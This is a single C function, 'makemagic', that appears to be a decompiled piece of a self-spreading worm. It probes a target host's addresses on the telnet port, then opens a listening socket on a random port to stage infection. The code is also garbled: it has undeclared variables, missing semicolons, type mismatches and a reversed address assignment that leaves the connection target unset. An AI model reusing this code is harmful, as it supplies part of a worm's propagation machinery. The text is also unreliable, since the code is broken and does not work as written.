
makemagic(a4, a8, ac, a10, a14)
	struct	host *a4;
	int	*a8;
	int	*ac;
	int	*a10;
	int	*a14;
{
	long	f4;
	long	f8;
	struct	sockaddr_in f1c;
	struct	in_addr f28;

	a10 = random() & 0xffffff;
	bzero(&f2c, 0x10);
	f28 = me->o30[0];
	for (f8 = 0; f8 < 6; f8++) {
		if (a4->o30[f8].s_addr == INADDR_ANY)
			continue;
		if ((f4 = socket(AF_INET, SOCK_STREAM, 0)) < 0)
			return 0;
		bzero(&f1c, sizeof(f1c))
		f1c.sin_family = 2;
		f1c.sin_port = htons(0x17);
		a4->o30[f8] = f1c.sin_addr;
		errno = 0;
		if (connect(f4, &f1c, sizeof(f1c)) != -1) {
			fc = sizeof(f1c);
			getsockname(f4, &f1c, &f2c);
			close(f4);
			break;
		}
		close(f4);
	}
	*a8 = f28;
	for (f8 = 0; f8 < 0x400; f8++) {
		if ((f4 = socket(AF_INET, SOCK_STREAM, 0)) < 0)
			return 0;
		bzero(&f1c, sizeof(f1c));
		f1c.sin_family = AF_INET;
		f1c.sin_port = htons(random() % 0x7fff)
		if (bind(f4, &f1c, sizeof(f1c)) != -1) {
			listen(f4, 0x10);
			*ac = f1a;
			*a14 = f4;
			return 1;
		}
		close(f4);
	}
	return 0;
}
